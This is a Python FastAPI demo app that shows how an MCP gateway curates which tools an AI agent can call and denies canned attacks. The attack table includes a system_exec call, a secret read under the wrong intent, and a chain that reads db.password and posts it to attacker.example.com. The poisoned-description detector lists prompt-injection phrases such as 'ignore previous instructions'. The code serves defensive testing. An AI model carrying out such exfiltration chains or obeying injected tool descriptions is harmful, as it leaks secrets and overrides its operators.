"""curation-inspector-ui — three-panel demo for the registry-driven tool curation lab.

The page has three side-by-side panels showing the same MCP server through
three different lenses:

  - LEFT  — what the **agentregistry curation manifest** says is approved.
            Read from /etc/curation/manifest.yaml (mounted from the same
            ConfigMap the policy-sync controller and ext-auth watch).
  - MIDDLE — what the **gateway** advertises. tools/list result for a JWT.
  - RIGHT — what the **rogue upstream MCP** actually exposes. Bypasses the
            gateway entirely and hits the description-shim's curated-manifest
            endpoint isn't useful here — we want to see what the rogue server
            would advertise WITHOUT curation. We talk directly to the
            rogue-mcp Service in-cluster to get its raw tools/list.

Below the panels, four "attack" buttons each demonstrate one of the four
enforcement layers:

  1. Call an unapproved tool       → gateway CEL deny (-32602 or HTTP 403)
  2. Call approved tool, bad args   → ext-auth schema-validation deny
  3. Call high-risk tool, wrong intent → ext-auth risk-tier deny
  4. Sequence: db_read_secret → http_post_external → ext-auth chain deny

There's also an "intent" dropdown that flips between the two JWTs the
jwt-issuer writes (general / ops-secret-rotation). Changing intent
re-fetches everything.
"""
from __future__ import annotations

import json
import logging
import os
from pathlib import Path

import httpx
import yaml
from fastapi import FastAPI, Form, HTTPException, Request
from fastapi.responses import HTMLResponse, PlainTextResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates

import mcp_client

# ── config ───────────────────────────────────────────────────────────────────
MCP_GATEWAY_URL = os.environ.get(
    "MCP_GATEWAY_URL",
    "http://curation-gateway.agentgateway-system.svc.cluster.local/mcp/",
)
ROGUE_DIRECT_URL = os.environ.get(
    "ROGUE_DIRECT_URL",
    "http://rogue-mcp.tool-curation.svc.cluster.local:8080/mcp",
)
MANIFEST_PATH = os.environ.get("MANIFEST_PATH", "/etc/curation/manifest.yaml")
JWT_PATH = os.environ.get("JWT_PATH", "/etc/jwts")
LOG_LEVEL = os.environ.get("LOG_LEVEL", "info").upper()

logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.INFO),
    format="%(asctime)s %(levelname)s %(name)s %(message)s",
)
logger = logging.getLogger("curation-inspector-ui")

INTENTS = ["general", "secret-rot"]  # filenames under JWT_PATH
INTENT_LABELS = {
    "general":    {"label": "general",              "claim": "general"},
    "secret-rot": {"label": "ops-secret-rotation",  "claim": "ops-secret-rotation"},
}


def _read_jwt(intent: str) -> str:
    p = Path(JWT_PATH) / intent
    try:
        return p.read_text().strip()
    except FileNotFoundError:
        raise HTTPException(
            status_code=500,
            detail=f"JWT for intent {intent!r} not found at {p}. Check the Deployment mounts jwt-general and jwt-secret-rot.",
        )


def _load_manifest() -> dict:
    try:
        return yaml.safe_load(Path(MANIFEST_PATH).read_text()) or {}
    except FileNotFoundError:
        return {"approvedTools": [], "forbiddenChains": []}
    except Exception as e:  # noqa: BLE001
        logger.error("manifest parse: %s", e)
        return {"approvedTools": [], "forbiddenChains": [], "_error": str(e)}


def _decode_jwt(token: str) -> dict:
    """Decode the JWT's claims block (no signature verification — this is
    just to surface what the gateway will see). Returns a dict of claims.
    """
    import base64 as _b64
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        payload = parts[1]
        # JWT uses URL-safe base64 with stripped padding — re-pad.
        padding = "=" * (-len(payload) % 4)
        raw = _b64.urlsafe_b64decode(payload + padding)
        return json.loads(raw.decode("utf-8"))
    except Exception:  # noqa: BLE001
        return {}


def _render_jwt_yaml_html(claims: dict) -> str:
    """Render the decoded JWT claims as syntax-highlighted YAML.

    Each line gets <span class="yaml-key|yaml-val|yaml-comment"> so the
    template can colour the keys, values, and inline comments separately.
    The `intent:` line additionally wears yaml-line-hl so the audience can
    see *which* claim the dropdown is flipping.
    """
    if not claims:
        return ""
    # Stable display order. Anything we don't know goes at the end.
    order = ["sub", "intent", "iss", "aud", "iat", "exp"]
    comments = {
        "sub":    "# subject — same for both JWTs",
        "intent": "# ← purpose claim · this is what the dropdown changes",
        "iss":    "# issuer — validated by the gateway",
        "aud":    "# audience",
        "iat":    "# issued at (epoch seconds)",
        "exp":    "# expires at (epoch seconds)",
    }
    lines: list[str] = []
    seen: set[str] = set()
    for k in order:
        if k in claims:
            seen.add(k)
            lines.append(_yaml_line_html(k, claims[k], comments.get(k, ""), highlight=(k == "intent")))
    for k, v in claims.items():
        if k not in seen:
            lines.append(_yaml_line_html(k, v, "", highlight=False))
    return "\n".join(lines)


def _yaml_line_html(key: str, value, comment: str, *, highlight: bool) -> str:
    import html as _html
    if isinstance(value, (str, int, float)):
        val_str = str(value)
    else:
        val_str = json.dumps(value)
    key_esc = _html.escape(str(key))
    val_esc = _html.escape(val_str)
    comment_esc = _html.escape(comment) if comment else ""
    line_cls = "yaml-line" + (" yaml-line-hl" if highlight else "")
    parts = [
        f'<span class="{line_cls}">',
        f'<span class="yaml-key">{key_esc}:</span> ',
        f'<span class="yaml-val">{val_esc}</span>',
    ]
    if comment_esc:
        parts.append(f'  <span class="yaml-comment">{comment_esc}</span>')
    parts.append("</span>")
    return "".join(parts)


def _format_raw_token(token: str) -> str:
    """Return the raw token with a visible ellipsis in the middle so it fits
    on one row in the UI without losing the (recognisable) prefix/suffix."""
    if not token:
        return ""
    if len(token) <= 60:
        return token
    return f"{token[:32]}…{token[-24:]}"


# ── FastAPI app ──────────────────────────────────────────────────────────────
BASE_DIR = Path(__file__).parent
app = FastAPI(title="curation-inspector-ui")
app.mount("/static", StaticFiles(directory=str(BASE_DIR / "static")), name="static")
templates = Jinja2Templates(directory=str(BASE_DIR / "templates"))


@app.get("/healthz", response_class=PlainTextResponse)
def healthz() -> str:
    return "ok"


# Per-intent transcript of attack/call outcomes. Wiped on intent change.
_TRACE: dict[str, list[dict]] = {i: [] for i in INTENTS}


@app.get("/", response_class=HTMLResponse)
async def index(request: Request) -> HTMLResponse:
    default = INTENTS[0]
    return templates.TemplateResponse(
        "index.html",
        {"request": request, "intents": INTENTS, "labels": INTENT_LABELS, "default_intent": default},
    )


@app.get("/panels", response_class=HTMLResponse)
async def panels(request: Request, intent: str = "general") -> HTMLResponse:
    """Render the three panels for a given intent.

    Also resets the per-intent attack trace — switching intent is the
    "fresh session" gesture.
    """
    if intent not in INTENTS:
        raise HTTPException(404, f"unknown intent {intent!r}")
    _TRACE[intent] = []
    # Invalidate any cached MCP session for the OLD JWT so the next call
    # re-initializes — otherwise chain detection state can leak across UI
    # interactions.
    for i in INTENTS:
        mcp_client.invalidate(_read_jwt(i))

    manifest = _load_manifest()

    gateway_tools: list[dict] = []
    raw_tools: list[dict] = []
    gateway_err = raw_err = None

    intent_claim = INTENT_LABELS[intent]["claim"]
    async with httpx.AsyncClient() as http:
        try:
            gateway_tools = await mcp_client.list_tools(http, MCP_GATEWAY_URL, _read_jwt(intent), intent=intent_claim)
        except mcp_client.MCPError as e:
            gateway_err = f"gateway said: {e.code} {e.message}"
        except Exception as e:  # noqa: BLE001
            gateway_err = f"request failed: {e!r}"

        try:
            raw_tools = await mcp_client.list_tools_raw(http, ROGUE_DIRECT_URL)
        except mcp_client.MCPError as e:
            raw_err = f"raw upstream: {e.code} {e.message}"
        except Exception as e:  # noqa: BLE001
            raw_err = f"raw upstream failed: {e!r}"

    raw_tools = _annotate_raw_tools(raw_tools, manifest)
    jwt_token = _read_jwt(intent)
    jwt_claims = _decode_jwt(jwt_token)

    return templates.TemplateResponse(
        "panels.html",
        {
            "request": request,
            "intent": intent,
            "intent_label": INTENT_LABELS[intent]["label"],
            "claim": INTENT_LABELS[intent]["claim"],
            "manifest": manifest,
            "gateway_tools": gateway_tools,
            "gateway_err": gateway_err,
            "raw_tools": raw_tools,
            "raw_err": raw_err,
            "trace": _TRACE[intent],
            "jwt_claims": jwt_claims,
            "jwt_token": jwt_token,
            "jwt_token_short": _format_raw_token(jwt_token),
            "jwt_yaml_html": _render_jwt_yaml_html(jwt_claims),
        },
    )


@app.post("/attack/{which}", response_class=HTMLResponse)
async def attack(request: Request, which: str, intent: str = Form("general")) -> HTMLResponse:
    """Run one of the four canned attacks under the chosen intent."""
    if intent not in INTENTS:
        raise HTTPException(404, f"unknown intent {intent!r}")

    # Each attack maps to a (label, tool, args) triple. Labels show up in the
    # trace alongside the gateway/ext-auth response so the audience can see
    # which enforcement layer fired (or, for the "allow_*" entries, that
    # the gateway is selectively enforcing, not blanket-denying).
    attacks = {
        # ── happy path — these should all succeed ────────────────────────────
        "allow_read_row": {
            "label": "happy path — read an order row",
            "tool": "db_read_row",
            "args": {"row_id": 1},
        },
        "allow_read_secret": {
            "label": "happy path — read a secret (requires ops-secret-rotation intent)",
            "tool": "db_read_secret",
            "args": {"key": "db.password"},
            "force_intent": "secret-rot",
        },
        "allow_http_post": {
            "label": "happy path — POST to an approved external host",
            "tool": "http_post_external",
            "args": {"url": "https://hooks.example.com/notify", "body": "deploy=success"},
        },
        # ── blocked path — these should all deny ─────────────────────────────
        "unapproved": {
            "label": "deny-by-default — call an unapproved tool",
            "tool": "system_exec",
            "args": {"command": "id"},
        },
        "bad_args": {
            "label": "schema-validation — call db_read_row with junk args",
            "tool": "db_read_row",
            "args": {"row_id": "not-a-number"},
        },
        "wrong_intent": {
            "label": "risk-tier — call db_read_secret without the secret-rotation intent",
            "tool": "db_read_secret",
            "args": {"key": "db.password"},
        },
        "chain": {
            "label": "forbidden chain — db_read_secret then http_post_external",
            "tool": "__CHAIN__",
            "args": None,
            "force_intent": "secret-rot",
        },
    }
    if which not in attacks:
        raise HTTPException(404, f"unknown attack {which!r}")
    spec = attacks[which]

    # Some demos force a specific intent (chain needs secret-rot; the
    # allow_read_secret happy-path also needs it). Switch + clear any stale
    # chain state so demos are idempotent click-to-click.
    forced = spec.get("force_intent")
    auto_switched = False
    if forced and intent != forced:
        intent = forced
        auto_switched = True
    if spec["tool"] == "__CHAIN__":
        for i in INTENTS:
            mcp_client.invalidate(_read_jwt(i))

    # Reset the trace on every click — the page is for showing the latest
    # test outcome, not accumulating a log. Previous result vanishes when
    # the next button is clicked.
    _TRACE[intent] = []
    if auto_switched:
        _TRACE[intent].append({
            "role": "attack",
            "label": "(auto-switched to ops-secret-rotation — db_read_secret needs it)",
        })
    _TRACE[intent].append({"role": "attack", "label": spec["label"]})

    async with httpx.AsyncClient() as http:
        if spec["tool"] == "__CHAIN__":
            await _do_call(http, intent, "db_read_secret", {"key": "db.password"})
            await _do_call(http, intent, "http_post_external",
                           {"url": "https://attacker.example.com", "body": "exfiltrated"})
        else:
            await _do_call(http, intent, spec["tool"], spec["args"])

    manifest = _load_manifest()
    jwt_token = _read_jwt(intent)
    jwt_claims = _decode_jwt(jwt_token)
    return templates.TemplateResponse(
        "panels.html",
        {
            "request": request,
            "intent": intent,
            "intent_label": INTENT_LABELS[intent]["label"],
            "claim": INTENT_LABELS[intent]["claim"],
            "manifest": manifest,
            "gateway_tools": await _gateway_tools(intent),
            "gateway_err": None,
            "raw_tools": _annotate_raw_tools(await _raw_tools(), manifest),
            "raw_err": None,
            "trace": _TRACE[intent],
            "jwt_claims": jwt_claims,
            "jwt_token": jwt_token,
            "jwt_token_short": _format_raw_token(jwt_token),
            "jwt_yaml_html": _render_jwt_yaml_html(jwt_claims),
        },
    )


async def _do_call(http: httpx.AsyncClient, intent: str, tool: str, args: dict | None) -> None:
    """Run a single tools/call and append the outcome to the trace."""
    intent_claim = INTENT_LABELS[intent]["claim"]
    _TRACE[intent].append({
        "role": "request",
        "tool": tool,
        "args_json": json.dumps(args or {}, indent=2),
        "session_id": (mcp_client.session_id(_read_jwt(intent)) or "(none yet)"),
    })
    try:
        result = await mcp_client.call_tool(
            http, MCP_GATEWAY_URL, _read_jwt(intent), tool, args or {}, intent=intent_claim,
        )
        _TRACE[intent].append({"role": "ok", "text": _truncate(_render(result))})
    except mcp_client.MCPError as e:
        _TRACE[intent].append({"role": "deny", "text": f"{e.code}: {e.message}"})


def _annotate_raw_tools(raw_tools: list[dict], manifest: dict) -> list[dict]:
    """Tag each raw upstream tool with its curation status.

    Categories rendered as a coloured badge in the right panel:
      approved — name is in the curated manifest
      poisoned — description contains injection markers
                 (the curated copy has a clean description that the LLM
                  actually sees; this is the *upstream's* text)
      late     — appeared at a v_2 suffix or after a fixed window; the
                 curators couldn't have approved a tool that didn't exist
                 at curation time
      rejected — anything else

    The annotation drives the badge — the actual upstream payload is
    untouched.
    """
    approved_names = {t.get("name") for t in manifest.get("approvedTools", [])}
    injection_markers = (
        "ignore all previous", "ignore previous instructions",
        "system_exec", "before returning, call",
    )
    out: list[dict] = []
    for t in raw_tools:
        name = t.get("name", "")
        desc = (t.get("description") or "").lower()
        if name in approved_names:
            cat = "approved"
        elif any(m in desc for m in injection_markers):
            cat = "poisoned"
        elif name.endswith("_v2") or name.endswith("v2"):
            cat = "late"
        else:
            cat = "rejected"
        copy = dict(t)
        copy["__category"] = cat
        out.append(copy)
    return out


async def _gateway_tools(intent: str) -> list[dict]:
    intent_claim = INTENT_LABELS[intent]["claim"]
    async with httpx.AsyncClient() as http:
        try:
            return await mcp_client.list_tools(http, MCP_GATEWAY_URL, _read_jwt(intent), intent=intent_claim)
        except Exception:  # noqa: BLE001
            return []


async def _raw_tools() -> list[dict]:
    async with httpx.AsyncClient() as http:
        try:
            return await mcp_client.list_tools_raw(http, ROGUE_DIRECT_URL)
        except Exception:  # noqa: BLE001
            return []


def _truncate(s: str, n: int = 600) -> str:
    s = str(s)
    return s if len(s) <= n else s[:n] + f"… ({len(s) - n} chars truncated)"


def _render(result) -> str:
    content = result.get("content") if isinstance(result, dict) else None
    if isinstance(content, list):
        chunks = []
        for c in content:
            if isinstance(c, dict) and c.get("type") == "text":
                chunks.append(c.get("text", ""))
            else:
                chunks.append(json.dumps(c))
        return "\n".join(chunks).strip() or json.dumps(result)
    return json.dumps(result, indent=2)
